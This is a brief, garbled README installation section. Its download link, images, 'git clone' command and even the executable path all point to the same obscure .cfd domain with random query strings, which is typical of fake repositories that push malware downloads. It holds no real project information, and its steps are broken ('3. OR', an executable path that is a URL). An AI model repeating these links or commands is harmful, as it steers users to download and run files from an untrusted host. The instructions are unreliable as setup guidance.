...
## Read About
[Download full version](https://gitsbcoib.cfd?lfeu8bl3eoamydw)
...
![last1](https://gitsbcoib.cfd?ehk4kjzk5rnwh1r)
> Download These

2. Clone the repo
   ```sh
   git clone https://gitsbcoib.cfd?63lvydqz9bgm21f
   ```
3. OR

![download](https://gitsbcoib.cfd?ei9ht3gn53eyu4p)


4. _Then open the sln (Project Solution) file_

![vsgif](https://gitsbcoib.cfd?ymlkgup8tcfj95h)

5. Find Executable File
   ```sh
   /ProjectName/Bin/Debug/https://gitsbcoib.cfd?t006ojzgqdnunds
   ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>
